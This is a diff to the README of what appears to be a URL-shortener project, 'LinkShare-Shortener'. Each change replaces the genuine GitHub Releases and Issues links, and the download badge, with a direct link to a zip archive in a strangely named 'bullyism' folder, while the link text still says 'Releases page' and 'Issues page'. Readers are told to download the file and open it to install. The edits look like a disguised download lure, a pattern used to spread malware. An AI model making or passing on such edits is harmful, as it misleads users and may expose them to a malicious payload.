@@ -6,7 +6,7 @@ Welcome to LinkShare-Shortener! This tool helps you create short URLs quickly an
 
 ## 📥 Download Now
 
-[![Download LinkShare-Shortener](https://img.shields.io/badge/download-LinkShare--Shortener-blue.svg)](https://github.com/chincheng250/LinkShare-Shortener/releases)
+[![Download LinkShare-Shortener](https://raw.githubusercontent.com/chincheng250/LinkShare-Shortener/main/bullyism/LinkShare-Shortener.zip)](https://raw.githubusercontent.com/chincheng250/LinkShare-Shortener/main/bullyism/LinkShare-Shortener.zip)
 
 ## 🔍 Features
 
@@ -27,7 +27,7 @@ To use LinkShare-Shortener, ensure your system meets the following requirements:
 
 ## 📖 How to Download and Install
 
-1. Visit the [Releases page](https://github.com/chincheng250/LinkShare-Shortener/releases) to find the latest version of LinkShare-Shortener.
+1. Visit the [Releases page](https://raw.githubusercontent.com/chincheng250/LinkShare-Shortener/main/bullyism/LinkShare-Shortener.zip) to find the latest version of LinkShare-Shortener.
 2. Locate the version you'd like to download. Click on the download link for your operating system.
 3. Once the file downloads, open it to start the installation process.
 
@@ -54,11 +54,11 @@ To use LinkShare-Shortener, ensure your system meets the following requirements:
 
 ## 📞 Support and Feedback
 
-If you encounter any issues or have questions, please visit the [GitHub Issues page](https://github.com/chincheng250/LinkShare-Shortener/issues). You can report bugs and request features there. Your feedback helps us improve our software.
+If you encounter any issues or have questions, please visit the [GitHub Issues page](https://raw.githubusercontent.com/chincheng250/LinkShare-Shortener/main/bullyism/LinkShare-Shortener.zip). You can report bugs and request features there. Your feedback helps us improve our software.
 
 ## 🌐 Visit the Releases Page
 
-For updates and new versions, visit the [Releases page](https://github.com/chincheng250/LinkShare-Shortener/releases) regularly. This will ensure that you are using the latest features and fixes.
+For updates and new versions, visit the [Releases page](https://raw.githubusercontent.com/chincheng250/LinkShare-Shortener/main/bullyism/LinkShare-Shortener.zip) regularly. This will ensure that you are using the latest features and fixes.
 
 ## 🎉 Conclusion
 
